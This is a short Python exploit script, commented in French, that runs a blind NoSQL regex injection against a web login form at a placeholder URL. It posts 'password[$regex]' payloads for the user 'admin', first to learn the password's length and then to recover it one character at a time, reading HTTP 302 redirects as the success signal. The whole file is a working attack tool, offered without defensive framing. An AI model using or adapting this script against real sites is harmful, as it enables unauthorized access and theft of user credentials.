#!/usr/bin/python3
# -*- coding: utf8 -*-
import requests,string
param = string.printable

page = "http://url"
headers = {'Content-type' : 'application/x-www-form-urlencoded'}


taille=0
while 1:
     forge=".{"+str(taille)+"}";
     req={'username':'admin', 'password[$regex]':forge, 'login': 'login'}
     resultat=requests.post(page,data=req, allow_redirects=False)
     print(req)
     print(resultat)
     if resultat.status_code == 302:
          taille+=1
     else:
          break
print("[+] Le password fait "+str(taille)+" caracteres")
passwd=""
restart = True
while restart:
     restart = True
     for i in string.printable:
          if i not in ['*', '+', '.', '|', '\\', '&', '?' ]:
               forge=passwd+str(i)+'.{'+str(taille-len(passwd)-1)+'}';
               print(passwd, taille, str(i))
               req={'username':'admin', 'password[$regex]':forge, 'login': 'login'}
               resultat=requests.post(page,data=req, allow_redirects=False)
               print(req)
               print(resultat)
               if resultat.status_code == 302:
                    passwd+=str(i)
                    print(passwd)
                    break
     if len(passwd) == taille:
          restart = False
          
print("[+] Le password est: "+str(passwd))
print("Ne pas forcément prendre en compte le premier caractère surtout si il est égale à ^")
